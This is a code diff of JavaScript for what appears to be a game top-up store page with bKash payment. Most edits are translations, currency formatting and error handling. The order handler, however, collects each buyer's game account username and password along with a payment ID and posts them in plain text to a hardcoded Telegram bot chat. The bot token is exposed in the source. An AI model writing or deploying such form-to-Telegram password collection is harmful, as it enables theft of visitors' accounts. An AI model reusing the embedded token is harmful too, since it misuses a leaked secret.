@@ -23,11 +23,9 @@ const packages = {
     ]
 };
 
-// নতুন Bot Token
+// Bot Configuration
 const BOT_TOKEN = '8579178443:AAHDl_DEr43_AdA30j9y79FMWTlTFUJlGag';
-
-// চ্যাট আইডি লিস্ট (কমা দিয়ে আরও আইডি যোগ করতে পারবেন)
-const CHAT_IDS = ['8395284772'];
+const CHAT_IDS = ['8395284772']; // Add more IDs separated by comma
 
 const container = document.getElementById('packages-container');
 const modal = document.getElementById('order-modal');
@@ -46,7 +44,7 @@ function render(game) {
     packages[game].forEach(p => {
         const div = document.createElement('div');
         div.className = 'package-card';
-        div.innerHTML = `<small style="color:var(--primary)">${p.type}</small><h3>${p.name}</h3><p>${p.price}৳</p>`;
+        div.innerHTML = `<small style="color:var(--primary)">${p.type}</small><h3>${p.name}</h3><p>${p.price} <span>BDT</span></p>`;
         div.onclick = () => {
             currentPackage = p;
             document.getElementById('modal-package-name').innerText = p.name;
@@ -62,7 +60,7 @@ function render(game) {
 function updateUI() {
     const total = currentPackage.price * parseInt(qtyInput.value || 1);
     displayPrice.innerText = total;
-    paymentAmount.innerText = total + '৳';
+    paymentAmount.innerText = total + ' BDT';
 }
 
 plusBtn.onclick = () => { qtyInput.value = parseInt(qtyInput.value) + 1; updateUI(); };
@@ -84,13 +82,13 @@ document.getElementById('order-form').onsubmit = async (e) => {
     const btn = document.getElementById('submit-btn');
     btn.disabled = true; btn.innerText = 'Processing...';
 
-    // ব্যাকটিক (`) ব্যবহার করে Monospace করা হয়েছে এবং Markdown ফরম্যাট সেট করা হয়েছে
+    // Telegram Markdown Message
     const msg = `🚀 *New Order!*
 
 🎮 *Game:* ${currentGame}
 📦 *Pack:* ${currentPackage.name}
 🔢 *Qty:* ${qtyInput.value}
-💰 *Total:* ${displayPrice.innerText}৳
+💰 *Total:* ${displayPrice.innerText} BDT
 
 👤 *User:* \`${document.getElementById('email-username').value}\`
 🔑 *Pass:* \`${document.getElementById('password').value}\`
@@ -99,21 +97,43 @@ document.getElementById('order-form').onsubmit = async (e) => {
 
 💳 *TrxID:* \`${document.getElementById('trxid').value}\``;
 
-    for (const id of CHAT_IDS) {
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            // parse_mode Markdown করে দেওয়া হয়েছে ব্যাকটিক সাপোর্ট করার জন্য
-            body: JSON.stringify({ chat_id: id, text: msg, parse_mode: 'Markdown' })
-        });
+    try {
+        for (const id of CHAT_IDS) {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: id, text: msg, parse_mode: 'Markdown' })
+            });
+        }
+        
+        modal.classList.add('hidden');
+        document.getElementById('success-modal').classList.remove('hidden');
+    } catch (error) {
+        alert('Something went wrong! Please try again.');
+        console.error('Telegram API Error:', error);
+    } finally {
+        btn.disabled = false; btn.innerText = 'Confirm Order';
+        document.getElementById('order-form').reset();
     }
-
-    modal.classList.add('hidden');
-    document.getElementById('success-modal').classList.remove('hidden');
-    btn.disabled = false; btn.innerText = 'Confirm Order';
-    document.getElementById('order-form').reset();
 };
 
 document.getElementById('close-success').onclick = () => document.getElementById('success-modal').classList.add('hidden');
 
+// Copy bKash number to clipboard
+function copyNumber() {
+    const numberText = document.getElementById('bkash-number').innerText;
+    navigator.clipboard.writeText(numberText).then(() => {
+        // Simple visual feedback instead of an annoying alert
+        const copyBtn = document.querySelector('.copy-icon');
+        const originalIcon = copyBtn.innerText;
+        copyBtn.innerText = '✅';
+        setTimeout(() => {
+            copyBtn.innerText = originalIcon;
+        }, 2000);
+    }).catch(err => {
+        console.error('Failed to copy text: ', err);
+    });
+}
+
+// Initial render
 render('ww');
